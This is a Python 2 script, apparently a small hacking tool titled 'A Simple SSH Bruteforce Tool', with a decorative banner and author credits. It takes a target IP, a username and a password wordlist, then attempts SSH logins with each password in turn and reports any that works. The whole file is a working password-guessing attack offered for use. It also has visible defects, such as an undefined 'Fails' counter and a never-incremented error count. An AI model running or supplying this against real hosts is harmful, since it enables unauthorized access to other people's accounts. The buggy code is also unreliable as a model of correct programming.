import pxssh
import os
import time

os.system("clear")
print("""\033[1;31m                                                                                                                                   
                                                                                                                                                                                                                  
                                                                                                                                                                                                                     ___   __   _   _____   __   _   _       ___  ___   _____   _____  __    __ 
    /   | |  \ | | /  _  \ |  \ | | | |     /   |/   | | ____| |___  | \ \  / / 
   / /| | |   \| | | | | | |   \| | | |    / /|   /| | | |__       / /  \ \/ /  
  / / | | | |\   | | | | | | |\   | | |   / / |__/ | | |  __|     / /    }  {   
 / /  | | | | \  | | |_| | | | \  | | |  / /       | | | |___    / /    / /\ \  
/_/   |_| |_|  \_| \_____/ |_|  \_| |_| /_/        |_| |_____|  /_/    /_/  \_\                                                          
   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                      
                                                                                                                                """)
print("\033[1;33mA Simple SSH Bruteforce Tool")
print("\033[1;33mAuthor: Hamza anonimeSecurity Researcher")
print("\033[1;33mEmail:hamzaanonime@gmail.com")
print("\033[1;33mCompany: Anonime7x")
print("\033[1;33mVersion: 1.0")
print("\033[1;33mLicensed by: MIT")





host = raw_input("Enter IP Address:")
user = raw_input("Enter Username:")
dict1 = raw_input("Enter Dictionary File Location:")
print("\033[1;31mNOTE: PRESS CTRL+C WHEN YOU SEE PASSWORD FOUND")


def connect(host, user, dict1):
    errors=0
    try:
        s = pxssh.pxssh()
        s.login(host, user, dict1)
        print('\033[1;32mPassword Found: ' + dict1+"\033[1;31m")
        return s
    except Exception as e:
        if errors > 5:
            print
            "!!! Too Many Socket Timeouts"
            exit(0)
        elif 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            return connect(host, user, dict1)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            return connect(host, user, dict1)
        return None


if host and user and dict1:
    with open(dict1, 'r') as infile:
        for line in infile:
            password = line.strip('\r\n')
            print("Testing: " + str(password))
            connect(host, user, password)
